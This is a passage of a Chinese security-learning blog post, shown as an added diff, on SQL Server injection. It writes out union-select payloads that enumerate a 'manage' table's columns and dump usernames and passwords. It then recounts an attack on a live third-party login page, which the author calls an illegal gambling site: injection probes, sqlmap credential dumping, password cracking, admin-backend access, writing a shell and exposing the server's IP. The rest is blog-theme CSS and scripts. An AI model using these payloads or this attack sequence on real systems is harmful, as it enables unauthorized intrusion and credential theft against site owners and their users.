+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615173351895.png"></p>
+<p>获取除了manage以外的表名</p>
+<p>-获取列名：<br>and 1&#x3D;2 union all select null,(select top 1 col_name(object_id(‘manage’),1)from sysobjects),null,null</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615173951469.png"></p>
+<p>and 1&#x3D;2 union all select null,(select top 1 col_name(object_id(‘manage’),2)from sysobjects),null,null</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174007280.png"></p>
+<p>and 1&#x3D;2 union all select null,(select top 1 col_name(object_id(‘manage’),3)from sysobjects),null,null</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174016167.png"></p>
+<p>敲4的时候就没了，一共就3个.</p>
+<p>and 1&#x3D;2 union all select null,username,password,null from manage</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174118034.png"></p>
+<h3 id="结尾彩蛋-某Q牌违法登录框注入"><a href="#结尾彩蛋-某Q牌违法登录框注入" class="headerlink" title="结尾彩蛋-某Q牌违法登录框注入"></a>结尾彩蛋-某Q牌违法登录框注入</h3><p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174216456.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174351989.png"></p>
+<p>典型的sql语句报错</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174409346.png"></p>
+<p>asp，net搭建的搭配的数据库一般是sqlserver</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174504437.png"></p>
+<p>输入admin12’ and (select count(*) from sysobjects)&gt;0—+&amp;password&#x3D;213213，回显正常</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174607149.png"></p>
+<p>输入admin12’ and (select count(*) from msysobjects)&gt;0—+&amp;password&#x3D;213213，回显异常</p>
+<p>这样测试说明了数据库是SQLserver</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174700505.png"></p>
+<p>说明字段15个</p>
+<p>回显位有5，开始进行上面的公式注入操作就行了</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174906863.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174937647.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174948640.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174957221.png"></p>
+<p>sqlmap脚本自动化注入</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175204100.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175409841.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175427198.png"></p>
+<p>获取数据库名称</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615174937647.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175526957.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175541480.png"></p>
+<p>获取当前数据库名称</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175602798.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175615173.png"></p>
+<p>获取当前数据库下的表名</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175657401.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175731071.png"></p>
+<p>获取列名</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175752215.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175832695.png"></p>
+<p>获取账号和密码</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175900668.png"></p>
+<p>解密得到真实密码</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615175935340.png"></p>
+<p>进入到菠菜网站的后台</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615180050040.png"></p>
+<p>判断当前用户是否为高权限用户</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615180111234.png"></p>
+<p>True！</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615180133598.png" alt="image-20240615180133598"></p>
+<p>直接写入shell代码</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615180233322.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615180311183.png"></p>
+<p>对方ip地址出来了</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615180617634.png"></p>
+<p>读取服务器版本</p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615180647508.png"></p>
+<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615180804108.png"></p>
+<p><img src="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/image-20240615180824918.png"></p>
+
+      
+       
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2024 f4k3r
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+<div id="musicMouseDrag" style="position:fixed; z-index: 9999; bottom: 0; right: 50px;">
+    <div id="musicDragArea" style="position: absolute; top: 0; left: 0; width: 100%;height: 10px;cursor: move; z-index: 10;"></div>
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=298 height=52 src="//music.163.com/outchain/player?type=2&id=427606780&auto=0&height=32"></iframe>
+    </div>
+
+<script>
+    var $DOC = $(document)
+    $('#musicMouseDrag').on('mousedown', function (e) {
+      // 阻止文本选中
+      $DOC.bind("selectstart", function () {
+        return false;
+      });
+      $('#musicDragArea').css('height', '100%');
+      var $moveTarget = $('#musicMouseDrag');
+      $moveTarget.css('border', '1px dashed grey')
+      var div_x = e.pageX - $moveTarget.offset().left;
+      var div_y = e.pageY - $moveTarget.offset().top;
+      $DOC.on('mousemove', function (e) {
+        var targetX = e.pageX - div_x;
+        var targetY = e.pageY - div_y;
+        targetX = targetX < 0 ? 0 : (targetX + $moveTarget.outerWidth() >= window.innerWidth) ? window.innerWidth - $moveTarget.outerWidth() : targetX;
+        targetY = targetY < 0 ? 0 : (targetY + $moveTarget.outerHeight() >= window.innerHeight) ? window.innerHeight - $moveTarget.outerHeight() : targetY;
+        $moveTarget.css({'left': targetX + 'px', 'top': targetY + 'px', 'bottom': 'inherit', 'right': 'inherit'})
+      }).on('mouseup', function () {
+        $DOC.unbind("selectstart");
+        $DOC.off('mousemove')
+        $DOC.off('mouseup')
+        $moveTarget.css('border', 'none')
+        $('#musicDragArea').css('height', '10px');
+      })
+    })
+</script>
+
+</html>
